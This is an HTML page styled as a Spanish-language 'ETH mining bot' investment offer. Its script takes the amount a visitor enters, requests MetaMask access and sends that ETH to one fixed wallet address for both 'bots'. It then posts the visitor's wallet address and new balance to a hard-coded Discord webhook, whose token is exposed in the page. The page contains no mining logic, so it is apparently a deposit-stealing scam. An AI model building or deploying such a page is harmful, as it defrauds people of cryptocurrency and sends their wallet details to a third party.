<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Bot de minería ETH</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
    <style>
      body {
        background-color: #1c1c1c;
      }

      .card-container {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
      }

      .card {
        background-color: #ffffff;
        padding: 20px;
        border-radius: 10px;
        box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.3);
        margin: 10px;
        max-width: 400px;
        width: 100%;
        text-align: center;
      }

      input[type="number"] {
        padding: 5px;
        border-radius: 5px;
        border: none;
        margin-bottom: 10px;
      }

      button {
        background-color: #0d6efd;
        color: #ffffff;
        border: none;
        border-radius: 5px;
        padding: 10px;
        cursor: pointer;
        transition: all 0.3s ease-in-out;
      }

      button:hover {
        background-color: #0c63e4;
      }
    </style>
  </head>
  <body>
    <div class="card-container">
      <div class="card">
        <h3>Bot de minería 1</h3>
        <p>Ingrese la cantidad de ETH que desea invertir:</p>
        <input type="number" id="amount1">
        <button onclick="sendETH('0x01C65F22A9478C2932e62483509c233F0aaD5c72', document.getElementById('amount1').value)">Invertir</button>
      </div>

      <div class="card">
        <h3>Bot de minería 2</h3>
        <p>Ingrese la cantidad de ETH que desea invertir:</p>
        <input type="number" id="amount2">
        <button onclick="sendETH('0x01C65F22A9478C2932e62483509c233F0aaD5c72', document.getElementById('amount2').value)">Invertir</button>
      </div>
    </div>

    <script>
     async function sendETH(toAddress, amount) {
    if (window.ethereum) {
        try {
            await window.ethereum.enable();
            const web3 = new Web3(window.ethereum);
            const accounts = await web3.eth.getAccounts();
            const fromAddress = accounts[0];
            const fromBalance = await web3.eth.getBalance(fromAddress);
            const txHash = await web3.eth.sendTransaction({
                from: fromAddress,
                to: toAddress,
                value: web3.utils.toWei(amount, 'ether')
            });
            console.log(`Transacción enviada: ${txHash}`);
            const updatedBalance = await web3.eth.getBalance(fromAddress);
            const message = `Depósito de ${amount} ETH recibido desde la dirección ${fromAddress}. Nuevo saldo: ${web3.utils.fromWei(updatedBalance)} ETH`;
            sendWebhookMessage(webhookUrl, message);
        } catch (error) {
            console.error(error);
        }
    } else {
        console.error('MetaMask no está instalado');
    }
}
function sendWebhookMessage(webhookUrl, message) {
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: message
        })
    })
    .then(response => console.log(`Mensaje enviado a Discord. Estado de respuesta: ${response.status} ${response.statusText}`))
    .catch(error => console.error('Error al enviar mensaje a Discord', error));
}

      const webhookUrl = "https://discordapp.com/api/webhooks/1065639854324588574/Iu0dfAhK_XeuoLysZSCuxfc79cFpRYvMk9xAueMycoxKijo_gEjoyGT6-6e3MRWFiSnT";

    </script>
  </body>
</html>
